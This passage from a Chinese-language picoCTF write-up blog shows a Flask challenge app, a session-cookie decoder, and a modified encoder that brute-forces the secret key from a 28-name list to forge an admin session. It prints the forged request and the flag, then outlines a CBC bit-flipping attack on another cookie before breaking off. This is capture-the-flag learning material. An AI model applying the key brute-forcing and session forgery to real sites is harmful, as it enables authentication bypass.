class="line">		<span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/search&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span>():</span></span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;name&quot;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> request.form[<span class="string">&quot;name&quot;</span>] <span class="keyword">in</span> cookie_names:</span><br><span class="line">		resp = make_response(redirect(<span class="string">&quot;/display&quot;</span>))</span><br><span class="line">		session[<span class="string">&quot;very_auth&quot;</span>] = request.form[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">		<span class="keyword">return</span> resp</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		message = <span class="string">&quot;That doesn&#x27;t appear to be a valid cookie.&quot;</span></span><br><span class="line">		category = <span class="string">&quot;danger&quot;</span></span><br><span class="line">		flash(message, category)</span><br><span class="line">		resp = make_response(redirect(<span class="string">&quot;/&quot;</span>))</span><br><span class="line">		session[<span class="string">&quot;very_auth&quot;</span>] = <span class="string">&quot;blank&quot;</span></span><br><span class="line">		<span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/reset&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset</span>():</span></span><br><span class="line">	resp = make_response(redirect(<span class="string">&quot;/&quot;</span>))</span><br><span class="line">	session.pop(<span class="string">&quot;very_auth&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">	<span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/display&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">	<span class="keyword">if</span> session.get(<span class="string">&quot;very_auth&quot;</span>):</span><br><span class="line">		check = session[<span class="string">&quot;very_auth&quot;</span>]</span><br><span class="line">		<span class="keyword">if</span> check == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">			resp = make_response(render_template(<span class="string">&quot;flag.html&quot;</span>, value=flag_value, title=title))</span><br><span class="line">			<span class="keyword">return</span> resp</span><br><span class="line">		flash(<span class="string">&quot;That is a cookie! Not very special though...&quot;</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> render_template(<span class="string">&quot;not-flag.html&quot;</span>, title=title, cookie_name=session[<span class="string">&quot;very_auth&quot;</span>])</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		resp = make_response(redirect(<span class="string">&quot;/&quot;</span>))</span><br><span class="line">		session[<span class="string">&quot;very_auth&quot;</span>] = <span class="string">&quot;blank&quot;</span></span><br><span class="line">		<span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>查看<code>/display</code>路由发现可以通过构造<code>admin</code>的<code>cookie-session</code>访问得到flag<br>flask的session具有特性：<br>构造<code>session</code>需要<code>secret_key</code>，每次产生的cookie都不相同，本题的<code>secret_key</code>在28个字段中随机抽取，每次启动抽取一次。<br>解码<code>session</code>不需要密钥。<br>解码脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span>(<span class="params">payload</span>):</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class="line">                        <span class="string">&#x27;an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class="line">                            <span class="string">&#x27;decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(decryption(<span class="string">&quot;eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YkGSWw.ujNEUVIqbRA0MVZCG7G0qxUOJAk&quot;</span>.encode()))</span><br></pre></td></tr></table></figure>
<p>编码脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;</span></span><br><span class="line">__author__ = <span class="string">&#x27;Wilson Sumanang, Alexandre ZANNI&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># standard imports</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"><span class="comment"># Abstract Base Classes (PEP 3119)</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] &lt; <span class="number">3</span>: <span class="comment"># &lt; 3.0</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Must be using at least Python 3&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta, abstractmethod</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABC, abstractmethod</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lib for argument parsing</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># external Imports</span></span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MockApp</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, secret_key</span>):</span></span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FSCM</span>(<span class="params">metaclass=ABCMeta</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">secret_key, session_cookie_structure</span>):</span></span><br><span class="line">            <span class="string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">session_cookie_value, secret_key=<span class="literal">None</span></span>):</span></span><br><span class="line">            <span class="string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==<span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FSCM</span>(<span class="params">ABC</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">secret_key, session_cookie_structure</span>):</span></span><br><span class="line">            <span class="string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">session_cookie_value, secret_key=<span class="literal">None</span></span>):</span></span><br><span class="line">            <span class="string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==<span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># Args are only relevant for __main__ usage</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">## Description for help</span></span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">                description=<span class="string">&#x27;Flask Session Cookie Decoder/Encoder&#x27;</span>,</span><br><span class="line">                epilog=<span class="string">&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## prepare sub commands</span></span><br><span class="line">    subparsers = parser.add_subparsers(<span class="built_in">help</span>=<span class="string">&#x27;sub-command help&#x27;</span>, dest=<span class="string">&#x27;subcommand&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the encode command</span></span><br><span class="line">    parser_encode = subparsers.add_parser(<span class="string">&#x27;encode&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;encode&#x27;</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--secret-key&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">&#x27;Secret key&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--cookie-structure&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">&#x27;Session cookie structure&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the decode command</span></span><br><span class="line">    parser_decode = subparsers.add_parser(<span class="string">&#x27;decode&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;decode&#x27;</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--secret-key&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">&#x27;Secret key&#x27;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--cookie-value&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">&#x27;Session cookie value&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## get args</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="comment">##test</span></span><br><span class="line">    aim=<span class="string">&quot;eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YkAKOg.NwOodx1E0kNm0ZuAEwOPXdUTXzU&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(FSCM.decode(aim))</span><br><span class="line">    cookie_names = [<span class="string">&quot;snickerdoodle&quot;</span>, <span class="string">&quot;chocolate chip&quot;</span>, <span class="string">&quot;oatmeal raisin&quot;</span>, <span class="string">&quot;gingersnap&quot;</span>, <span class="string">&quot;shortbread&quot;</span>, <span class="string">&quot;peanut butter&quot;</span>, <span class="string">&quot;whoopie pie&quot;</span>, <span class="string">&quot;sugar&quot;</span>, <span class="string">&quot;molasses&quot;</span>, <span class="string">&quot;kiss&quot;</span>, <span class="string">&quot;biscotti&quot;</span>, <span class="string">&quot;butter&quot;</span>, <span class="string">&quot;spritz&quot;</span>, <span class="string">&quot;snowball&quot;</span>, <span class="string">&quot;drop&quot;</span>, <span class="string">&quot;thumbprint&quot;</span>, <span class="string">&quot;pinwheel&quot;</span>, <span class="string">&quot;wafer&quot;</span>, <span class="string">&quot;macaroon&quot;</span>, <span class="string">&quot;fortune&quot;</span>, <span class="string">&quot;crinkle&quot;</span>, <span class="string">&quot;icebox&quot;</span>, <span class="string">&quot;gingerbread&quot;</span>, <span class="string">&quot;tassie&quot;</span>, <span class="string">&quot;lebkuchen&quot;</span>, <span class="string">&quot;macaron&quot;</span>, <span class="string">&quot;black and white&quot;</span>, <span class="string">&quot;white chocolate macadamia&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> ck <span class="keyword">in</span> cookie_names:</span><br><span class="line">        <span class="comment">##print(ck)</span></span><br><span class="line">        f=<span class="built_in">open</span>(<span class="string">&#x27;/root/Desktop/task/1.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        py=<span class="string">&#x27;&#123;&quot;very_auth&quot;:&quot;admin&quot;&#125;&#x27;</span></span><br><span class="line">        test= FSCM.encode(ck,py)</span><br><span class="line">        <span class="comment">#print(FSCM.decode(test))</span></span><br><span class="line">        f.write(test+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(ck+<span class="string">&#x27;  &#x27;</span>+test)</span><br><span class="line">        <span class="keyword">if</span> test==aim:</span><br><span class="line">            <span class="built_in">print</span>(ck)</span><br><span class="line">    <span class="comment">## find the option chosen</span></span><br><span class="line">    <span class="keyword">if</span>(args.subcommand == <span class="string">&#x27;encode&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> args.cookie_structure <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.encode(args.secret_key, args.cookie_structure))</span><br><span class="line">    <span class="keyword">elif</span>(args.subcommand == <span class="string">&#x27;decode&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.decode(args.cookie_value,args.secret_key))</span><br><span class="line">        <span class="keyword">elif</span>(args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.decode(args.cookie_value))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>爆破获得密钥<br>构造payload：<code>&#39;&#123;&quot;very_auth&quot;:&quot;admin&quot;&#125;&#39;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">GET /display HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: mercury.picoctf.net:65344</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Referer: http://mercury.picoctf.net:65344/</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cookie: name=-1; session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YkGS_w.pHefYOy1L_8ZAK0IlteWzQttBhc</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>获得flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;jumbotron&quot;&gt;</span><br><span class="line">     &lt;p class=&quot;lead&quot;&gt;&lt;/p&gt;</span><br><span class="line">     &lt;p style=&quot;text-align:center; font-size:30px;&quot;&gt;</span><br><span class="line">     &lt;b&gt;Flag&lt;/b&gt;: &lt;code&gt;</span><br><span class="line">     picoCTF&#123;pwn_4ll_th3_cook1E5_25bdb6f6&#125;</span><br><span class="line">     &lt;/code&gt;&lt;/p&gt;</span><br><span class="line"> &lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h2 id="More-COOKIE"><a href="#More-COOKIE" class="headerlink" title="More_COOKIE"></a>More_COOKIE</h2><p>没有提供源码。<br>burp抓包得到cookie信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: name=-1; session=eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YkGPoA.LOouJ_MDhpAP-qA8p1gOhTi0dUw; auth_name=QnZkTU9DdjB1NWtDMmJUdDBKSTJRTzFSdFBSMUpzVUx3UitrcnZEbjFYcHdPSGF3UHVrbGFWb0w5MlZZRU9vUWRkdG5USDcwdmZzWFhYcXVxOEQyelBJc3NCT2ZnVlhUSXM2RGRNMlR2cjRRVUFwaldtakZQTUNGcmtoSGpIN1U=</span><br></pre></td></tr></table></figure>
<p>由于没有secret_key,所以暂时不考虑flasksession的可能。<br>base解码auth_name得到加密后的密文<br>没有什么头绪，但cookie可能存在cbc字节翻转攻击。<br>在已知第一组密文和第二组明文的情况下，将二者和目标字符异或后可以任意改变目标字符。<br>本题条件：</p>
<ol>
<li>组大小未知</li>
<li>vi初始向量未知</li>
<li>已知明文为admin=<code>0</code>，位置未知。</li>
<li>目标字符<code>1</code>未知位置</li>
<li>密文已知</li>
<li>正确的偏移量可以通过服务器的解析而不是500错误<br>尝试从1~10的所有字符和0~96异或,从而让目标值翻转。<br>解题脚本</li>
</ol>
